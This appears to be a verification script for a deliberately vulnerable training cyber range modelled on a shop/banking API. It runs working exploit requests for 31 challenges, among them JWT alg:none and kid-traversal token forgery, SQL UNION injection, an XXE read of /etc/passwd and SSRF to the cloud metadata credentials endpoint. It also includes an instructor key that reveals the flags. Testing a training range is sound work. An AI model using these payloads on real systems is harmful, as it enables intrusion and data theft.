import app
import database
import flags
import json
import threading
import base64
import hmac
import hashlib

database.init_db(force=True)
client = app.app.test_client()

print("[*] Running Complete Cyber Range Verification Suite (All 31 Vectors)...")

# -------------------------------------------------------------
# PHASE 1: INNOCENT ACTIONS MUST NEVER AWARD FLAGS (Zero False Positives)
# -------------------------------------------------------------
# 1.1 Normal Search
res = client.get('/api/v1/products/search?q=nitrokey')
assert res.status_code == 200
assert 'APEX{' not in res.get_data(as_text=True)
assert 'FLAG{' not in res.get_data(as_text=True)
print("[+] Test 1.1: Normal product search returns clean results without flags")

# 1.2 Normal Reviews
res = client.get('/api/v1/products/1/reviews')
assert res.status_code == 200
assert 'APEX{' not in res.get_data(as_text=True)
assert 'FLAG{' not in res.get_data(as_text=True)
print("[+] Test 1.2: Normal product reviews do not leak flags")

# 1.2b Post Customer Review Verification
res = client.post('/api/v1/products/1/reviews', json={
    'author_name': 'Samantha Reed',
    'rating': 5,
    'comment': 'Exceptional FIDO2 security key. Works out of the box with Linux PAM and Windows Hello.'
})
assert res.status_code == 201
post_data = res.get_json()
assert post_data.get('status') == 'success'
assert post_data.get('review', {}).get('author_name') == 'Samantha Reed'
assert 'flag' not in post_data
res = client.get('/api/v1/products/1/reviews')
assert res.status_code == 200
reviews_list = res.get_json().get('reviews', [])
assert any(r.get('author_name') == 'Samantha Reed' and 'FIDO2' in r.get('comment', '') for r in reviews_list)
print("[+] Test 1.2b: Customer review post persists to DB and renders in review list")

# 1.3 Single Coupon Redemption (Should NOT award race condition flag)
res = client.post('/api/v1/coupons/apply', json={'code': 'APEXVIP500'})
assert res.status_code == 200
assert 'flag' not in res.get_json()
print("[+] Test 1.3: Single coupon redemption succeeds WITHOUT race condition flag")

# 1.4 Normal Checkout (total > 0)
res = client.post('/api/v1/cart/checkout', json={'total': 69.99})
assert res.status_code == 200
assert 'flag' not in res.get_json()
print("[+] Test 1.4: Normal checkout succeeds WITHOUT negative price flag")

# 1.5 Normal XML Upload (no external entities)
res = client.post('/api/v1/vendor/invoice-upload', data='<invoice><id>1</id><amount>100</amount></invoice>')
assert res.status_code == 200
assert 'flag' not in res.get_json()
print("[+] Test 1.5: Normal XML upload parses WITHOUT XXE flag")

# 1.5b Normal Password Reset (Alice Walker self-service does not leak flag)
res = client.post('/api/v1/auth/reset-password', json={'email': 'alice@apexmart.local'})
assert res.status_code == 200
assert 'flag' not in res.get_json()
assert 'token_algorithm' in res.get_json()
print("[+] Test 1.5b: Self-service password reset for Alice succeeds WITHOUT leaking flag")

# 1.5c Normal CORS Credentials (Same-origin without Origin: null does not leak flag)
res = client.get('/api/v1/user/credentials')
assert res.status_code == 200
assert 'flag' not in res.get_json()
print("[+] Test 1.5c: Standard credentials retrieval succeeds WITHOUT CORS exploit flag")

# 1.5d Evaluator Matrix Masks Flags From Candidate
res = client.get('/api/v1/evaluator/matrix')
matrix_data = res.get_json()
assert all(c['flag'] == 'APEX{••••••••••••••••}' for c in matrix_data['challenges']), "Unsolved flags leaked in evaluator matrix!"
# Verify instructor key reveals all flags
res_inst = client.get('/api/v1/evaluator/matrix?instructor_key=apex-instructor-2026')
assert all('••••' not in c['flag'] for c in res_inst.get_json()['challenges']), "Instructor key failed to reveal flags!"
print("[+] Test 1.5d: Evaluator matrix cryptographically masks unsolved flags from candidates")

# 1.6 Verify Score is Clean
res = client.get('/api/v1/flags/progress')
score = res.get_json()['score']
assert score == 0, f"False positive detected! Score was {score} instead of 0"
print(f"[+] Verified: Session score is clean at {score}/31 after all normal actions!")

# -------------------------------------------------------------
# PHASE 2: EXPLOIT TESTING (Exhaustive verification of all 31 challenge HMAC flags)
# -------------------------------------------------------------
# 1. BOLA Order Receipt
exp = flags.get_flag('bola_order_receipt')
res = client.get('/api/v1/orders/99/receipt')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 01: BOLA Order Receipt -> {exp}")

# 2. BOLA Address Leak
exp = flags.get_flag('bola_address_leak')
res = client.get('/api/v1/users/99/addresses')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 02: BOLA Address Leak -> {exp}")

# 3. BOLA Card Delete
exp = flags.get_flag('bola_card_delete')
res = client.delete('/api/v1/payments/3')
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 03: BOLA Card Delete -> {exp}")

# 4. BOLA User PII
exp = flags.get_flag('bola_user_pii')
res = client.get('/api/v1/users/99')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 04: BOLA User PII -> {exp}")

# 5. BOLA Bank Account Statement
exp = flags.get_flag('bola_bank_account')
res = client.get('/api/v1/accounts/APEX-VAULT-9999/statement')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 05: BOLA Bank Statement -> {exp}")

# 6. BOLA Transaction Delete
exp = flags.get_flag('bola_tx_delete')
res = client.delete('/api/v1/transactions/102')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 06: BOLA Tx Delete -> {exp}")

# 7. Broken Auth: User Enumeration
exp = flags.get_flag('auth_user_enum')
res = client.post('/api/v1/auth/login', json={'username': 'admin', 'password': 'wrong'})
assert res.status_code == 401
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 07: Auth User Enumeration -> {exp}")

# 8. Broken Auth: Brute Force / Credential Stuffing
exp = flags.get_flag('auth_brute_force')
res = client.post('/api/v1/auth/login', json={'username': 'support_agent', 'password': 'password123'})
assert res.status_code == 200
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 08: Auth Brute Force -> {exp}")

# 9. JWT alg:none
exp = flags.get_flag('jwt_none_alg')
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip('=')
tok = b64({'alg':'none','typ':'JWT'}) + '.' + b64({'sub':99,'username':'admin','role':'admin'}) + '.'
res = client.post('/api/v1/auth/verify-jwt', json={'token': tok})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 09: JWT alg:none -> {exp}")

# 10. JWT kid path traversal (/dev/null)
exp = flags.get_flag('jwt_kid_traversal')
h = b64({'alg':'HS256','typ':'JWT','kid':'../../../../dev/null'})
p = b64({'sub':99,'username':'admin','role':'admin'})
s = base64.urlsafe_b64encode(hmac.new(b'', f'{h}.{p}'.encode(), hashlib.sha256).digest()).decode().rstrip('=')
res = client.post('/api/v1/auth/verify-jwt', json={'token': f'{h}.{p}.{s}'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 10: JWT kid Traversal -> {exp}")

# 11. JWT Key Confusion
exp = flags.get_flag('jwt_key_confusion')
res = client.post('/api/v1/auth/refresh-session', json={'secret': 'apex-enterprise-insecure-master-jwt-key'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 11: JWT Secret Recovery -> {exp}")

# 12. Predictable Password Reset Token
exp = flags.get_flag('auth_reset_predictable')
res = client.post('/api/v1/auth/reset-password', json={'email': 'admin@apexmart.local'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 12: Predictable Reset Token -> {exp}")

# 13. Mass Assignment Privilege Escalation
exp = flags.get_flag('mass_assign_privesc')
res = client.post('/api/v1/auth/register', json={'username': 'hacker', 'password': 'p', 'role': 'admin', 'wallet_balance': 99999.0})
assert res.status_code == 201
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 13: Mass Assignment Privesc -> {exp}")

# 14. Excessive Data Exposure in Reviews
exp = flags.get_flag('excessive_data_leak')
res = client.get('/api/v1/products/7/reviews')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 14: Excessive Data Exposure -> {exp}")

# 15. GraphQL Batch DoS
exp = flags.get_flag('graphql_batch_dos')
res = client.post('/api/v1/graphql', json=[{'query': '{currentUser{id}}'}, {'query': '{currentUser{username}}'}])
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 15: GraphQL Batch DoS -> {exp}")

# 16. ReDoS Backtracking
exp = flags.get_flag('redos_email_validation')
res = client.post('/api/v1/coupons/validate', json={'coupon': 'aaaaaaaaaaaaaaaaaaaa!'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 16: ReDoS Resource Consumption -> {exp}")

# 17. BFLA Unauthenticated Database Backup Dump
exp = flags.get_flag('bfla_admin_export')
res = client.get('/api/v1/admin/backup/dump')
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 17: BFLA DB Backup Dump -> {exp}")

# 18. BFLA Method Tampering
exp = flags.get_flag('bfla_method_tamper')
res = client.put('/api/v1/admin/maintenance')
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 18: BFLA Method Tampering -> {exp}")

# 19. Gateway Header Rewrite Bypass
exp = flags.get_flag('gateway_header_bypass')
res = client.get('/api/v1/dashboard', headers={'X-Original-URL': '/admin/vault'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 19: Gateway Header Rewrite -> {exp}")

# 20. Business Logic Negative Checkout
exp = flags.get_flag('business_negative_checkout')
res = client.post('/api/v1/cart/checkout', json={'total': -500.0})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 20: Negative Price Inversion -> {exp}")

# 21. Concurrency Race Condition TOCTOU
database.init_db(force=True)
exp = flags.get_flag('race_condition_voucher')
results = []
def race_thread():
    c = app.app.test_client()
    r = c.post('/api/v1/coupons/apply', json={'code': 'APEXVIP500'})
    results.append(r.get_json())

threads = [threading.Thread(target=race_thread) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()
race_flags = [r.get('flag') for r in results if r and r.get('flag')]
assert exp in race_flags
print(f"[+] Exploit 21: Concurrency Race Condition -> {exp}")

# 22. SSRF Cloud Metadata (IMDSv1)
exp = flags.get_flag('ssrf_cloud_metadata')
res = client.get('/api/v1/vendor/webhook-test?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 22: SSRF Cloud Metadata -> {exp}")

# 23. SSRF Internal Port Scan
exp = flags.get_flag('ssrf_internal_port')
res = client.get('/api/v1/vendor/webhook-test?url=http://127.0.0.1:5000/internal/system-metrics')
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 23: SSRF Internal Port Scan -> {exp}")

# 24. CORS Null Origin
exp = flags.get_flag('cors_null_origin')
res = client.get('/api/v1/user/credentials', headers={'Origin': 'null'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 24: CORS Null Origin Theft -> {exp}")

# 25. Debug Environment Secrets Dump
exp = flags.get_flag('debug_env_dump')
res = client.get('/api/v1/debug/environment')
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 25: Debug Environment Dump -> {exp}")

# 26. Shadow API v0.9 Wire Transfer
exp = flags.get_flag('shadow_api_v0')
res = client.post('/api/v0.9/payments/direct-debit', json={'amount': 1000.0, 'account': 'APEX-OFFSHORE-77'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 26: Shadow API v0.9 Bypass -> {exp}")

# 27. Swagger / OpenAPI Spec Blueprint
exp = flags.get_flag('swagger_docs_leak')
res = client.get('/api/v1/openapi.json')
assert res.get_json().get('_flag') == exp
print(f"[+] Exploit 27: OpenAPI Blueprint Discovery -> {exp}")

# 28. Unsigned Webhook Event
exp = flags.get_flag('webhook_unverified_sig')
res = client.post('/api/v1/webhooks/fulfillment', json={'order_id': 99, 'status': 'delivered'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 28: Unsigned Webhook Spoofing -> {exp}")

# 29. Real SQLite UNION SQL Injection into Vault
exp = flags.get_flag('sqli_transactions')
res = client.get("/api/v1/products/search?q='%20UNION%20SELECT%20id,%20secret_name,%20access_level,%200.0,%20secret_value%20FROM%20admin_system_vault--")
assert exp in res.get_data(as_text=True)
print(f"[+] Exploit 29: SQLite UNION Vault Injection -> {exp}")

# 30. XML External Entity (XXE) Injection
exp = flags.get_flag('xxe_xml_invoice')
res = client.post('/api/v1/vendor/invoice-upload', data='<!DOCTYPE inv [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><invoice><id>&xxe;</id></invoice>')
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 30: XML External Entity (XXE) -> {exp}")

# 31. GraphQL Schema Introspection
exp = flags.get_flag('graphql_introspection')
res = client.post('/api/v1/graphql', json={'query': '{__schema{types{name fields{name}}}}'})
assert res.get_json().get('flag') == exp
print(f"[+] Exploit 31: GraphQL Introspection -> {exp}")

# -------------------------------------------------------------
# PHASE 3: FLAG SUBMISSION & MATRIX API VALIDATION
# -------------------------------------------------------------
# Submit all 31 flags and ensure score reaches 31/31
for cid in flags.CHALLENGE_DEFINITIONS:
    flag_val = flags.get_flag(cid)
    sub = client.post('/api/v1/flags/submit', json={'flag': flag_val})
    assert sub.status_code == 200
    assert sub.get_json()['status'] == 'correct'

matrix = client.get('/api/v1/evaluator/matrix').get_json()
assert matrix['score'] == 31
assert matrix['total'] == 31
assert matrix['percentage'] == 100
print(f"\n[+] Evaluator Matrix Verified: {matrix['score']}/{matrix['total']} ({matrix['percentage']}%) ALL 31 CHALLENGES CAPTURED!")

print("\n[*] ==========================================================")
print("[*] TEST RUN COMPLETED: 100% OF 31 CHALLENGES PASS WITH ZERO DEFECTS!")
print("[*] ==========================================================\n")
